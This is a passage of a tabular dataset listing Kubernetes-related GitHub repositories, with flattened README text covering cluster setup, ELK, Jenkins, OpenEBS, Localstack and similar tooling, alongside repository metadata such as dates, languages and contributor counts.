run o yaml kubectl replace f The exact command is actually printed out at the beginning of the lock process Supported k8s environments Currently only tested on EKS Test results and patches for other environments are welcome Re runs GitHub does not increment the GITHUBRUNNUMBER when you re run a workflow Therefore re runs will never successfully grab the lock since the lock value increases monotonically with each build The bottom line is that you should avoid re running your builds If you really want to re run a build you ll just need to intervene as per the Stuck locks section above,2020-11-20T22:43:27Z,2020-12-03T21:24:39Z,Shell,Organization,1,3,1,25,master,mgalgs#sponrad,2,0,1,0,0,0,1
samrakshak,ELK-STACK-K8S,,kubernetes elk Example to set up entire ELK Elastic Search Logstash and Kibana stack with kubernetes and minikube Pre requisite Docker VirtualBox Minikube or any existing kubernetes cluster aws gce etc up and running How to Run Execute elkup sh script from shell This will deploy and start following services Elastic Search Logstash Kibana Test on Minkube local cluster Run minikube dashboard and view logs from all the components Run minikube service kibana this will open kibana dashboard in browser Default username password elastic changeme Logstash is listening for log messages on port 5000 and expecting logs in JSON format Cleanup Execute elkdown sh script from shell which will remove all the deployments services and configMaps Run minikube stop to stop minikube cluster NOTE apiVersion apps v1 for versions before 1 9 0 use apps v1beta2,2020-10-03T13:57:15Z,2020-11-10T09:17:02Z,Shell,User,1,3,0,6,main,samrakshak,1,1,1,0,0,0,2
ziponia,spring-cloud-k8s,,spring cloud k8s MSA auth cluster core dashboard gateway display product,2020-08-20T08:44:22Z,2020-09-10T15:30:14Z,Java,User,2,3,0,3,master,ziponia,1,0,0,0,0,0,0
neverCase,k8s-exec-pod,k8s-exec-pod#k8s-logs-pod#terminal#websocket-proxy,k8s exec pod This is a simple and easy way for you to execute commands inside a k8s pod or watch logs through the websocket proxy Notice A terminal is not just an input field It s a complex system that provides advanced formatting and interactivity with the user over a plain character stream Here is a classic case if you transmit the command clear to the ssh pty then the response you received would be clear command not found So we should listen and compare each character instead of inputting a full command with the n e g pwdn build server sh CGOENABLED 0 GOOS linux GOARCH amd64 go build o exec bin example main go exec bin kubeconfig HOME kube config proxyservice 0 0 0 0 9090 v 4 if you run the exec binary file inside a k8s pod just use the command below exec bin proxyservice 0 0 0 0 9090 v 4 run websocketclient for testing log mode sh go run websocketclient go addr host port alsologtostderr true v 4 mode log ssh mode sh go run websocketclient go addr host port alsologtostderr true v 4 mode ssh,2020-09-09T10:03:02Z,2020-12-25T03:10:31Z,Go,User,1,3,1,22,master,neverCase,1,0,0,0,0,0,0
Awesomeware,jenkins-on-k8s,,Jenkins on Kubernetes More power for your CI on Kubernetes What is it This repository provides a set of convenient definitions and scripts to help you easily set up maintain and extend Jenkins as a service within a Kubernetes cluster The aim is to make use of Jenkins power and flexibility to provide you with a feature rich CI CD solution that is able to deploy multiple software components within your Kubernetes cluster and depending upon your configuration also promote those same software components into other environments The solution offered here is opinioniated in the sense that it aims to provide a good solution to companies that deploy software as a service and consist of one or more development teams and one or more DevOps engineers that have responsibility across all of those teams How do I use it Fork this repository and then add your own folder next to the folders within this repository We use kustomize https github com kubernetes sigs kustomize to deploy Jenkins and so you can place your own configuration into a folder as an overlay https kubectl docs kubernetes io references kustomize glossary overlay You can either extend from the base configuration base or one of the overlays overlays in this repository For more descriptive examples check out the examples examples in this repository Adding plugins To add a plugin to the Jenkins instance you can define the plugin in a plugins txt file within a ConfigMap and mount it under the jenkins plugins path For example yaml volumeMounts name jenkins base plugins mountPath jenkins plugins base name jenkins my plugins mountPath jenkins plugins mine These plugin lists will get concatenated and installed on startup You are not currently able to override plugin versions from the upstream kustomization you are extending so we try to keep plugin lists for upstream kustomizations to the minimum required for some given functionality or example In general though the base configuration has the bare minimum for any Jenkins instance and overlays in this repository get more and more opinionated about plugins and configuration Adding configuration To add your own configuration to execute on startup you can define a number of groovy files within a ConfigMap and mount them under the path For example yaml volumeMounts name jenkins base customization mountPath jenkins customization base name jenkins my customization mountPath jenkins customization mine The groovy files within these ConfigMaps are executed in alphabetical order by Jenkins To ensure better control by your own configuration the groovy file name are prefixed with the folder they are mounted under For example set best practice settings groovy in jenkins base customization would be named base set best practice settings groovy in the example above This allows you to execute both before and after any upstream configuration as you require by mounting your own ConfigMaps with particular names In the example above all configuration groovy in jenkins my customization would execute after configuration groovy in jenkins base customization and so could depend upon that prior configuration having already happened,2020-12-19T00:52:36Z,2020-12-23T17:00:45Z,Groovy,Organization,1,3,0,9,main,Stephen001,1,0,0,3,0,0,0
empathyco,ops-localhost-emulation,,Localhost Stack Requirements Docker K8s emulators Minikube https kubernetes io docs tasks tools install minikube Oldest option from K8s emulators Can specify kubernetes version Runs as Docker or some VirtualBox There are a bunch of addons https minikube sigs k8s io docs tasks addons available For instance cert manager nginx controller Runs images from localhost asciicast https asciinema org a IlTAXF1DeLLNPhAJA9KFMUT7B svg https asciinema org a IlTAXF1DeLLNPhAJA9KFMUT7B t 0 21 Deploy a cluster sh brew install minikube minikube start driver docker memory 8196 cpus 4 kubernetes version v1 18 0 Delete a cluster sh minikube delete Loading a local image in your cluster This is an example of pulling and running in the minikube cluster a nginx image sh minikube start driver docker memory 8196 cpus 4 kubernetes version v1 18 0 eval minikube docker env docker ps docker pull nginx docker tag nginx test nginx 1 0 kubectl run image test nginx 1 0 nginx app port 80 image pull policy Never kubectl port forward po nginx app 8080 80 Specify imagePullPolicy IfNotPresent or imagePullPolicy Never on your container s Kind https kind sigs k8s io docs user quick start K8s cluster into Docker containers Faster startup than Minikube Better documentation than Minikube Runs images from localhost previous load image as K3d Cluster setup as code asciicast https asciinema org a wJPD0vykaeK9YY9gZTHrOEWsn svg https asciinema org a wJPD0vykaeK9YY9gZTHrOEWsn t 1 08 Deploy a cluster sh brew install kind kind create cluster config kind cluster conf yaml Delete a cluster sh kind delete cluster Loading a local image in your cluster This is an example of pulling and running in the Kind cluster a nginx image sh docker pull nginx latest docker tag nginx latest localhost nginx 1 0 kind load localhost nginx 1 0 kubectl run image localhost nginx 1 0 localhost nginx port 80 image pull policy Never kubectl get po kubectl logs f Specify imagePullPolicy IfNotPresent or imagePullPolicy Never on your container s Ingress controller asciicast https asciinema org a hOGrrufd4LyClt3kEOFah1biW svg https asciinema org a hOGrrufd4LyClt3kEOFah1biW K3d https k3d io Lightweight k3s image from Docker Runs on Docker Runs faster than anyone More than enough to gain knowledge in k8s Runs images from localhost previous load image as Kind https github com iwilltry42 k3d demo https github com iwilltry42 k3d demo asciicast https asciinema org a 5ScyNfNirMGOY7a9eFoZUZztB svg https asciinema org a 5ScyNfNirMGOY7a9eFoZUZztB t 0 55 Deploy a cluster sh brew install k3d k3d cluster create mycluster Delete a cluster sh k3d cluster delete mycluster Loading a local image in your cluster This is an example of pulling and running in the K3d cluster a nginx image sh docker pull nginx latest docker tag nginx latest localhost nginx 1 0 k3d image import localhost nginx 1 0 c mycluster kubectl run image localhost nginx 1 0 localhost nginx port 80 image pull policy Never Specify imagePullPolicy IfNotPresent or imagePullPolicy Never on your container s Localstack asciicast https asciinema org a qwPP5j0I7woDOgjIMAdJO4B0I svg https asciinema org a qwPP5j0I7woDOgjIMAdJO4B0I t 0 33 For those interested in try their services before going to AWS they can deploy localstack in Minikube and create their AWS resources in localhost The steps to deploy localstack in your Minikube are the following K8s yaml definition details yaml image localstack localstack To be able to access from k8s kubectl expose pod localstack type ClusterIP name localstack If you want to access localstack from your localhost kubectl port forward po localstack 4566 4566 Now you can access your localstack pod For instance you can create a bucket From localhost sh aws endpoint url http localhost 4566 s3api list buckets aws endpoint url http localhost 4566 s3api create bucket bucket test localstack aws endpoint url http localhost 4566 s3 cp test sh s3 test localstack aws endpoint url http localhost 4566 s3 ls s3 test localstack From k8s sh aws endpoint url http localstack 4566 s3api list buckets aws endpoint url http localstack 4566 s3api create bucket bucket test localstack aws endpoint url http localstack 4566 s3 cp test sh s3 test localstack aws endpoint url http localstack 4566 s3 ls s3 test localstack For those supporters of Helm there are a Helm chart in this repo to deploy with the serverless services iam lambda dynamodb apigateway s3 sns More settings https github com localstack localstack configurations sh cd localstack helm install localstack f values yaml Happy Localstacking Official Localstack documentation https github com localstack localstack Localstack Samples Installation sh helm install localstack f values yaml SQS sample Golang code to test receive message in a Localstack SQS asciicast https asciinema org a 7ENgU8pXiopZgpulKWirWk3Zs svg https asciinema org a 7ENgU8pXiopZgpulKWirWk3Zs sh aws endpoint url http localstack localhost sqs list queues aws endpoint url http localstack localhost sqs create queue queue name MyQueue aws endpoint url http localstack localhost sqs send message queue url http localstack localhost 000000000000 MyQueue message body Information about the largest city in Any Region go run main go q MyQueue GCP Emulator GCP offers emulator for the following GCP services BigTable Datastore Firestore PubSub Spanner GCP PubSub Emulator GCP offers PubSub emulator A Helm chart has been setup to deploy it asciicast https asciinema org a K896u54QFB6IDMWzrTzL0HA6C svg https asciinema org a K896u54QFB6IDMWzrTzL0HA6C t 0 35 K8s yaml definition details yaml image google cloud sdk latest command gcloud beta emulators pubsub start host port 0 0 0 0 8085 project test sh helm install gcp emulator f values yaml cd gcp emulator samples pubsub go test v,2020-10-09T12:18:27Z,2020-12-07T14:58:45Z,Go,Organization,1,3,0,0,master,,0,0,0,0,0,0,0
ReyRen,k8sMLer-client-go,distributed-training#golang#kubernetes#kubernetes-client#websocket,k8sMLer client go 1 kubernetes client gokubernetes 2 websocket 3 ws hub https github com ReyRen k8sMLer client go blob master Hub jpg go version 1 14 go module require go version 1 12 google export GOPROXY https goproxy io GOPATH src dir git clone https github com ReyRen k8sMLer client go git make build make run storageclass web nfs StorageClass creation https github com ReyRen k8sMLer client go blob master storage README md pod scripts webnamespace common go common goserver IP intelmultus cnipodCNI,2020-09-16T09:07:48Z,2020-12-24T07:30:14Z,Go,User,1,3,0,83,master,ReyRen,1,0,0,1,9,0,1
jianz,k8s-reset-terminating-pv,,k8s reset terminating pv Reset persistent volume status from terminating back to bound Here are the details https jianz github io posts 2020 08 25 reset pv Purpose When delete a kubernetes persistent volume by accident it may stuck in the terminating status due to kubernetes io pv protection finalizer prevent it from being deleted You can use this tool to reset its status back to bound Installing You can download the latest compiled binary from here https github com jianz k8s reset terminating pv releases If you prefer to compile by yourself shell git clone git github com jianz k8s reset terminating pv git cd k8s reset terminating pv go build o resetpv Usage text Usage resetpv flags Flags etcd ca string CA Certificate used by etcd default ca crt etcd cert string Public key used by etcd default etcd crt etcd key string Private key used by etcd default etcd key etcd host string The etcd domain name or IP default localhost etcd port int The etcd port number default 2379 k8s key prefix string The etcd key prefix for kubernetes resources default registry h help help for resetpv For simplicity you can name the etcd certificate ca crt etcd crt etcd key and put them in the same directory as the tool resetpv The tool by default connect to etcd using localhost 2379 You can forward the etcd port on the pod to the localhost shell kubectl port forward pods etcd member master0 2379 2379 n etcd k8s key prefix Default set to registry for the community version of kubernetes as it uses registry as etcd key prefix the key for persistent volume pv1 is registry persistentvolumes pv1 Set to kubernetes io for OpenShift as it uses kubernetes io as prefix and the key for pv1 is kubernetes io persistentvolumes pv1 Example shell resetpv k8s key prefix kubernetes io pv eef4ec4b 326d 47e6 b11c 6474a5fd4d89 License k8s reset terminating pv is released under the MIT license,2020-08-22T03:25:35Z,2020-12-26T21:48:21Z,Go,User,2,3,0,3,master,jianz,1,1,1,2,0,0,0
qixiang-liu,image-pull,docker#image#k8s,k8sapi image 20201126101318792 https picgo img oss cn beijing aliyuncs com md img 2020 11 26 1606356798 png web websocket api shell http 127 0 0 1 8080 api sendImage POST curl curl location request POST http 127 0 0 1 8080 api sendImage header Content Type application json data raw k8sName local dockerPullImage userName passWord imageName docker io library busybox http 127 0 0 1 8080 api getRegisteredList GET curl curl http 127 0 0 1 8080 api getRegisteredList k8sname local agent docker build f Dockerfile agent t mirror registry xxx com ptc docker agent v3 docker push mirror registry xxx com ptc docker agent v3 key clusterName nodeIp ip serverAddr serverip server docker build f Dockerfile server t mirror registry xxx com ptc docker server v1 docker push mirror registry xxx com ptc docker server v1 key serverAddr serverip httpAddr webip,2020-11-26T11:57:23Z,2020-12-02T02:39:53Z,Go,User,1,3,0,2,master,qixiang-liu,1,1,1,0,0,0,3
yugabyte,spring-tanzu-workshop,,YugabyteDB Spring Developer Workshop for VMware Tanzu What will we build in this workshop In this workshop we ll look at how to build data driven microservices apps using Spring Boot and Yugabyte Distributed SQL database This will be focused on building a Retail Catalog lookup application use case which is a low latency resilient and HA lookup web service It will be a two hours hands on session where developers will get started with developing the Product Catalog and Cart microservices using familar spring modules like Spring Web Spring Data Cassandra and Spring Data JPA YugabyteDB cluster access will be provided to all the participants via options like Yugabyte Cloud or Yugabyte cluster deployed on the customer environment Session includes walk through of YugabyteDB concepts for app developers slide deck and hands on labs Retail Catalog Lookup application Architecture of Retail Catalog Lookup application images retail catalog app png Microservice YugabyteDB API Spring Projects Description Product Catalog https github com yugabyte spring tanzu workshop tree master product catalog microservice YCQL Spring Boot Spring Web Spring Data Cassandra This microservice serves the product catalog lookup information It uses Spring Data Cassandra repositories for querying the product catalog information stored in YugabyteDB YCQL Table Cart https github com yugabyte spring tanzu workshop tree master cart microservice YSQL Spring Boot Spring Web Spring Data JPA This microservice handles the shopping cart functionality It uses Spring Data JPA repositories for transactional commit into YugabyteDB YSQL Tables Agenda YugabyteDB Fundamentals Deploying YugabyteDB on Tanzu Kubernetes Grid TKG Implementing Product Catalog Microservice using Yugabyte CQL API NOSQL Implementing Cart Microservice using Yugabyte SQL API RDBMS Putting it all together on Tanzu environment Prerequisites Basic understanding of Spring Data and Spring Boot Basic familiarity with YugabyteDB fundamentals https docs yugabyte com latest explore Familiarity with running Linux commands and bash CLI IDE of choice Eclipse or IntelliJ or SpringSource Toolkit preferred Technical Requirements Java 1 8 installed GitHub account Maven installed Docker desktop installed Internet access ability to access sites via port 80 and 443 HTTPS,2020-10-22T21:35:46Z,2020-12-16T02:53:45Z,Java,Organization,11,3,1,26,master,nmalladi#nchandrappa#ameyb,3,0,0,0,0,0,0
febelery,notes,go#k8s#notes#php#web,,2020-10-20T09:04:43Z,2020-12-08T12:33:13Z,n/a,User,2,3,0,26,main,febelery,1,0,0,0,0,0,0
grafino,openebs,cloud-native#cstor#jiva#k8s#kubernetes#openebs#storage,OpenEBS OpenEBS is a Cloud Native software defined storage solution that enable us to use several storage options disks SSDs cloud volumes etc and use them to dynamically provision Kubernetes Persistent Volumes This prevents Cloud Lock in enables custom Storage classes per workload Replication Clones and Snapshots Container attached and container native storage on Kubernetes Each workload is provided with a dedicated storage controller Implements granular storage policies and isolation Completely in userspace making it highly portable Volumes provisioned through OpenEBS are always containerized and represented as a pod OpenEBS is a collection Storage Engines Jiva openebs Jiva README md cStor openebs cStor README md LocalPV hostpath openebs LocalPV hostpath README md LocalPV device openebs LocalPV device README md Engines Comparison OpenEBS openebs src openebs jpg Prerequisites iSCSI client Depending on kubernetes provider or solution with need to setup the iSCSI client https docs openebs io docs next prerequisites html Usually there is no need Default OpenEBS Setup on Kubernetes kubectl create namespace openebs helm repo add openebs https openebs github io charts helm repo update helm install namespace openebs openebs openebs openebs Important node Whe we setup the OpenEBS storage on the cluster the cloud default standard provider will not work In all sts and in the helm charts wehave to set the sc Node Device Manager NDM Is an important component in the OpenEBS architecture NDM treats block devices as resources that need to be monitored and managed just like other resources such as CPU Memory and Network It is a daemonset which runs on each node detects attached block devices based on the filters and loads them as block devices custom resource into Kubernetes These custom resources are aimed towards helping hyper converged Storage Operators by providing abilities like Easy to access inventory of Block Devices available across the Kubernetes Cluster Predict failures on the Disks to help with taking preventive actions Allow dynamically attaching detaching disks to a storage pod without restarting the corresponding NDM pod running on the Node where the disk is attached detached NDM daemon runs in containers and has to access the underlying storage devices and run in Privileged mode The Node Device Manager NDM is an important component of the OpenEBS control plane Each node in the Kubernetes cluster runs an NDM DaemonSet which is responsible for discovering the new block storage devices and if they match the filter it reports it to the NDM operator to register that as a block device resource NDM acts as the conduit between the control plane and the physical disks attached to each node It maintains the inventory of registered block storage devices in the etcd database which is the single source of truth for the cluster References https docs openebs io docs next ndm html mayactl The mayactl is the command line tool for interacting with OpenEBS volumes and Pools The mayactl is not used or required while provisioning or managing the OpenEBS volumes but it is currently used while debugging and troubleshooting OpenEBS volume and pool status can be get using the mayactl command For getting access to mayactl command line tool you have to login or execute into the maya apiserver pod on Kubernetes References https docs openebs io docs next mayactl html Maya online You can use the SaaS platform to monitor your openebs storage layer metrics and logs References https director mayadata io,2020-10-02T14:37:57Z,2020-11-19T02:08:32Z,n/a,User,1,3,0,2,master,grafino,1,0,0,0,0,0,0
devtron-labs,dashboard,dashboard#devops#devtron#k8s#kubernetes#kubernetes-dashboard#kubernetes-deployment#reactjs#typescript,This project was bootstrapped with Create React App https github com facebook create react app Available Scripts In the project directory you can run yarn start Runs the app in the development mode Open http localhost 3000 http localhost 3000 to view it in the browser The page will reload if you make edits You will also see any lint errors in the console yarn test Launches the test runner in the interactive watch mode See the section about running tests https facebook github io create react app docs running tests for more information yarn run build Builds the app for production to the build folder It correctly bundles React in production mode and optimizes the build for the best performance The build is minified and the filenames include the hashes Your app is ready to be deployed See the section about deployment https facebook github io create react app docs deployment for more information yarn run eject Note this is a one way operation Once you eject you cant go back If you arent satisfied with the build tool and configuration choices you can eject at any time This command will remove the single build dependency from your project Instead it will copy all the configuration files and the transitive dependencies Webpack Babel ESLint etc right into your project so you have full control over them All of the commands except eject will still work but they will point to the copied scripts so you can tweak them At this point youre on your own You dont have to ever use eject The curated feature set is suitable for small and middle deployments and you shouldnt feel obligated to use this feature However we understand that this tool wouldnt be useful if you couldnt customize it when you are ready for it commit process Now before commiting lint will run and check for errors It will not allow to commit if there are lint errors To fix them run yarn lint fix check package json It is not capable of fixing everything so some fixes has to be done manually Do s Try to make only one state per page rest every thing shall be pure A method should do one and only one thing Do function and variable namings so good you don t need comments While making smaller Components make them reusable Do most of the heavy lifting tasks inside smaller components not in the state component Do all the parsing and error handling on service state component should not get anything more than success and data or error and data Use BEM to name CSS classes and structure it Don ts Don t add if else on render add functions which render checks on smaller functions Don t add IDs for CSS if done correctly you never need ids Don t add unnecessary Indentations it doesn t improve readability Never add checks on the basis of text Don t use float use display instead use display flex box inline inline block Don t use mix type methods in a class Sentry Config SENTRYAUTHTOKEN SENTRYORG devtron labs SENTRYPROJECT dashboard DSN Sentry sourcemap upload console foo bar sh sentry sh Set custom sentry environment during production deployment default is staging console foo bar docker run p 3000 80 e SENTRYENV my custom env t artifact tag Disable sentry during production deployment default enabled console foo bar docker run p 3000 80 e SENTRYENABLED false t artifact tag Enable Hotjar during production deployment default disabled console foo bar docker run p 3000 80 e HOTJARENABLED false t artifact tag Enable google analytics during production deployment default disabled console foo bar docker run p 3000 80 e GAENABLED true t artifact tag Create test coverage report and save summary in report txt console foo bar npm run test coverage watchAll false report txt Upload Summary on slack console foo bar python uploadTestReport py Run Following Scripts after release console foo bar sh sentry sh foo bar npm run test coverage watchAll false report txt foo bar python uploadTestReport py Development setup with proxy src setupProxy js js const createProxyMiddleware require http proxy middleware module exports function app app use orchestrator createProxyMiddleware target http demo devtron info 32080 changeOrigin true logLevel info env development console GRAFANAORGID 2 REACTAPPEDITOR code REACTAPPORCHESTRATORROOT orchestrator REACTAPPPASSWORD argocd server 74b7b94945 nxxnh Development setup without proxy env development console GRAFANAORGID 2 REACTAPPEDITOR code REACTAPPORCHESTRATORROOT http demo devtron info 32080 orchestrator REACTAPPPASSWORD argocd server 74b7b94945 nxxnh,2020-10-27T13:06:23Z,2020-12-29T08:24:50Z,TypeScript,Organization,0,3,0,65,main,shivani170#nishant-d#hardik12-3#rashmirai21,4,0,0,6,1,5,26
duncanpierce,hetzanetes,golang#hetzner-cloud#k3s#k3s-cluster#k8s#k8s-cluster#kubernetes#kubernetes-cluster,Hetzanetes Create K3s Kubernetes clusters on Hetzner Cloud With apologies to Hetzner and Kubernetes for the name What does it do Right now it can only provision a single server with K3s Kubernetes The aim is to Provide a simple way to set up and manage Kubernetes clusters on Hetzner Cloud Avoid local configuration files be able to manage clusters from anywhere provided you have an API token Work with Rancher s lightweight K3s Kubernetes distribution https github com rancher k3s Avoid proliferation of installation options OS base images etc Install Hetzner s cloud controller manager https github com hetznercloud hcloud cloud controller manager and storage volume https github com hetznercloud csi driver plugins Set up a firewall and private network for the cluster like Vito Botta https github com vitobotta hetzner cloud init does Automate security updates where possible Make the cluster as self repairing as possible Synchronize SSH keys the cluster will accept with those registered in the Hetzner API handy if your lose you private key or your team changes Make SSH recognise new Hetzner servers so we don t get key changed errors Alternatives I wanted a simple way to create and manage Kubernetes clusters on Hetzner Cloud There are really good projects out there but none of them quite did what I wanted as of 2020 09 19 They are all worth checking out especially if this project doesn t meet your needs Pharmer https github com pharmer pharmer loads of features but doesn t support Hetzner Cloud Hetzner Kube https github com xetys hetzner kube impressive networking setup dates from before Hetzner Cloud had private networks load balancers and labels Uses kubeadm K3sup https github com alexellis k3sup great way to install Rancher s K3s Kubernetes on a cluster but it doesn t provision the cluster or up a firewall How it works 1 At the moment hetzanetes shares configuration with Hetzner s command line interpreter https github com hetznercloud cli so you need to configure that first If this is the first run you need to provide a Hetzner Cloud API token https console hetzner cloud projects your project Security API tokens 2 Hetzanetes will set up a private network in your Hetzner Cloud project attach some labels for configuration purposes and create a single Kubernetes API server node 3 in future When the single API server node starts it will create further API server and worker nodes and join them to the cluster 4 All nodes are joined to the private network have a firewall using ufw and are set up for unattended upgrades,2020-09-19T09:16:37Z,2020-10-09T14:58:11Z,Go,User,2,3,0,19,main,duncanpierce,1,0,0,0,0,0,0
halradaideh,gke-pvc-calculator,docker#gke#go#golang#k8s#kubernetes#metrics#monitor#persistent-volume#persistent-volume-claim#pv#pvc,GKE pvc Calculator This tool was created to export PVC statistics to GCP monitor as metrics in order to create alerts and monitor disk usage The tool is a go program that mount the host mount points of the pvs and check there size it is deployed as a daemonset in all the kubernetes nodes to build bash docker build t image tag notes please update the image on the deployment with the proper name and tag please add GCPPROJECT with the name of you project to watch to deploy go to the deploy directory and apply the yaml files bash kubectl apply f rbac yaml kubectl apply f gke daemonset yaml todo remove hack from code create helm deployment Thanks to Harris Dimitriou,2020-09-15T15:33:06Z,2020-12-11T16:44:05Z,Go,User,1,3,0,7,master,halradaideh,1,1,1,0,0,0,0
mdelder,k8s-pacman-app,,,2020-09-28T15:43:27Z,2020-12-09T14:37:23Z,n/a,User,1,2,11,38,main,mdelder#Loicavenel,2,0,0,0,0,0,9
InseeFrLab,k8s-onboarding,,,2020-10-29T09:13:33Z,2020-12-10T16:18:50Z,Java,Organization,6,2,9,69,master,olevitt#NicoLaval#Donatien26#alexisdondon#garronej#micedre#YMLG,7,0,0,3,10,0,45
mchirico,grokActions,,grokActions Grok k8s on Github Actions Please see the following video https player vimeo com video 449383747 STEP 1 Fork the following repo https github com mchirico grokActions STEP 2 Sign up for FREE version of NGROK and copy paste the secret into Github STEP 3 Enable Github Actions STEP 4 Make changes to the repo so that the action will run Once the cluster has been created get the link from NGROK https ngrok com,2020-08-19T15:00:52Z,2020-11-17T11:32:51Z,Makefile,User,1,2,5,10,master,mchirico,1,0,0,0,0,0,0
msa-mentor,k8s-workshop,,Docker Kubernetes Workshop 1 MSA Docker kubernetes Hands On Contents Pre requisite gcloud SDK Prerequisite md Chapter 1 First Step to Docker k8s Docker chapter1 README md chapter1 1 README md Chapter 2 Kubernetes Core Concept Hands On Core Concept chapter2 0 concept md Pod Hands On chapter2 1 pod md Controller Hands On chapter2 2 controller md Service Hands On chapter2 3 service md Volueme Hands On chapter2 4 volume md hands On Kubernetes Hands on https www katacoda com courses kubernetes,2020-11-13T01:16:29Z,2020-11-21T07:32:15Z,JavaScript,User,1,2,7,4,main,msa-mentor,1,0,0,0,0,0,0
dubareddy,docker_k8s_manifest,,kubernetesyamls I have did my best to capture all the example to create kubernetes objects docker and helm charts development kubernetes objects with example are segregated into folder with the topic name,2020-09-09T14:45:27Z,2020-12-23T12:08:18Z,Shell,User,1,2,5,1,master,dubareddy,1,0,0,0,0,0,0
abdennour,meetup-deployment-k8s,,Overview Resources for Meetup 5 k8saraby sample app sample app k8s yaml manifests manifests tested Meetup https lnkd in gdJyTz Wednesday August 26 2020 9 00 PM to 11 00 PM GMT 3 About kubernetes k8saraby cncf cka ckad rollout rollingupdate bluegreen redblack canary,2020-08-26T14:39:04Z,2020-10-30T12:47:04Z,HTML,User,1,2,4,6,master,abdennour,1,0,0,0,0,0,0
bakito,batch-job-controller,batch#job-scheduler#kubernetes#openshift,GitHub Workflow Status https img shields io github workflow status bakito batch job controller Github 20Build logo github https github com bakito batch job controller actions query workflow 3A 22Github Build 22 Travis com https img shields io travis com bakito batch job controller logo travis https travis ci com bakito batch job controller Docker Repository on Quay https quay io repository bakito batch job controller status Docker Repository on Quay https quay io repository bakito batch job controller Go Report Card https goreportcard com badge github com bakito batch job controller https goreportcard com report github com bakito batch job controller Coveralls github https img shields io coveralls github bakito batch job controller logo coveralls https coveralls io github bakito batch job controller branch master GitHub Release https img shields io github release bakito batch job controller svg style flat https github com bakito batch job controller releases Batch Job Controller The batch job controller allows executing pods on nodes of a cluster where the number of concurrent running pods can be configured Each pod can report it s results back to the controller to have them exposed as metrics Deployment The controller expects the following environment variables Name Value NAMESPACE The current namespace CONFIGMAPNAME The name of the configmap to read the config from Configuration The configuration has to be stored in a configmap with the following values config yaml Controller configuration yaml name name of the controller will also be used as prefix for the job pods jobServiceAccount service account to be used for the job pods If empty the default will be used jobNodeSelector node selector labels to define in which nodes to run the jobs runOnUnscheduledNodes true if true jobs are also started on nodes that are unschedulable cronExpression 42 3 the cron expression to trigger the job execution reportDirectory var www directory to store and serve the reports reportHistory 30 number of execution reports to keep podPoolSize 10 number of concurrent job pods to run runOnStartup true if true the jobs are triggered on startup of the controller startupDelay 10s the delay as duration that is used to start the jobs if runOnStartup is enabled default is 10s callbackServiceName name of the controller service callbackServicePort 8090 port of the controller callback api service custom additional properties that can be used in a custom implementation latestMetricsLabel false if true each result metric is also created with executionID latest metrics prefix foo prefix for the metrics exposed by the controller gauges metric gauges that will be exposed by the jobs The key is uses as suffix for the metrics test suffix of the metric help help help text for the metric labels list of labels to be used with the metric node and executionID are automatically added labela labelb pod template yaml The template of the pod to be started for each job When a pod is created it gets enriched by the controller specific configuration pkgjobjob go pkgjobjob go Job Pod The job pod has the following env variables provided by the controller Environment Name Value NAMESPACE The current namespace NODENAME The name of the node it is running on EXECUTIONID The id of the current job execution CALLBACKSERVICENAME The name host ip of the callback service to send the report to CALLBACKSERVICEPORT The port of the callback service to send the report to CALLBACKSERVICERESULTURL The full qualified URL of the result callback service CALLBACKSERVICEFILEURL The full qualified URL of the file callback service to send files to the controller CALLBACKSERVICEEVENTURL The full qualified URL of the event callback service to create k8s event Callback The controller exposes by default an endpoint to receive job results The report is stored locally and metrics of the reports will be exposed URL The report URL is by default CALLBACKSERVICERESULTURL Body The body of the report contains the metric suffixes that are also defined in the controller config Each metric has a decimal value and a map where the key is the label name and value is the value to be used for the metric label json test value 1 0 labels labela AAA labelb BBB value 2 554 labels labela AAA2 labelb BBB2 Example job script helmbatch job controllerbinrun sh helmbatch job controllerbinrun sh Upload additional files Additional files can be uploaded Use default Content Disposition header or the name query parameter to define the name of the file If the name is not defined an uuid is generated Each filename is prepended with the node name URL The report URL is by default CALLBACKSERVICEFILEURL Create k8s Events from job pod k8s Event can be created from each job pod by calling the event endpoint The reason should be short and unique it must be in UpperCamelCase format starting with a capital letter Simple Message json warning false reason TestReason message test message Massage with parameters json warning true reason TestReason message test message s args a1 URL The event URL is by default CALLBACKSERVICEEVENTURL Examples test queries http testdata test queries http,2020-08-19T17:58:46Z,2020-12-21T07:53:22Z,Go,User,1,2,2,74,master,bakito#dependabot[bot],2,8,8,0,6,0,54
tinkerbell,k8s-sandbox,,https img shields io badge Stability Experimental red svg k8s sandbox This repository is Experimental https github com packethost standards blob master experimental statement md meaning that it s based on untested ideas or techniques and not yet established or finalized or involves a radically new and innovative style This means that support is best effort at best and we strongly encourage you to NOT use this in production Tinkerbell https tinkerbell org is made of different components osie boots tink server tink worker and so on Currently they are under heavy development and we are working around the release process for all the components Here is a quick way to get the Tinkerbell stack up and running on Kubernetes https kubernetes io Currently it supports 1 Vagrant https www vagrantup com with libvirt and VirtualBox 2 Terraform https www terraform io on Equinix Metal https metal equinix com Getting Started Follow documentation Local Setup with Vagrant https docs tinkerbell org setup local vagrant or Packet Setup with Terraform https docs tinkerbell org setup packet terraform and replace docker compose up d kubectl apply f vagrant deploy kubernetes docker compose ps kubectl get pods docker compose logs f tink server boots nginx kubectl logs f l app in tink server boots nginx docker exec i deploytink cli1 tink kubectl exec i kubectl get pod l app tink cli o name tink Deploying on a standalone Kubernetes cluster is not yet supported Limitations Tinkerbell is unlikely to run on an existing Kubernetes cluster without additional configurations that require privileged node access to Kubernetes Also multi node clusters are not supported at the moment Docker and Shell Scripts The installation process is ported from the Sandbox https github com tinkerbell sandbox which uses Docker Compose and is still heavily dependent on shell scripts running locally and Docker CLI Host Path The NGINX data directory requires to be filled with about 4GB of data mostly OSIE https github com tinkerbell osie It is actually initialized from the setup sh script before Tinkerbell is installed The data is installed in a local directory and Kubernetes access it through a hostPath https kubernetes io docs concepts storage volumes hostpath Host Network and Service Node Ports Boots needs to access the same layer 2 network than the worker machine and Hegel needs to be on the same layer 3 network It is achieved using hostNetwork https kubernetes io docs concepts policy pod security policy host namespaces Moreover these services must run on ports ranging from 67 to 50061 which requires to to setup Kubelet s service node port range https kubernetes io docs concepts services networking service nodeport accordingly,2020-11-12T18:51:59Z,2020-12-16T12:25:59Z,Shell,Organization,15,2,2,12,main,detiber#mergify[bot]#gianarb#mrchrd,4,0,0,1,0,1,5
darebeat,k8s,,README k8s DOCKERVERSION 19 03 12 COMPOSEVERSION 1 27 2 K8SVERSION v1 16 5,2020-10-12T05:44:19Z,2020-11-19T11:39:40Z,Shell,Organization,1,2,0,23,master,wowtous,1,0,0,0,0,0,0
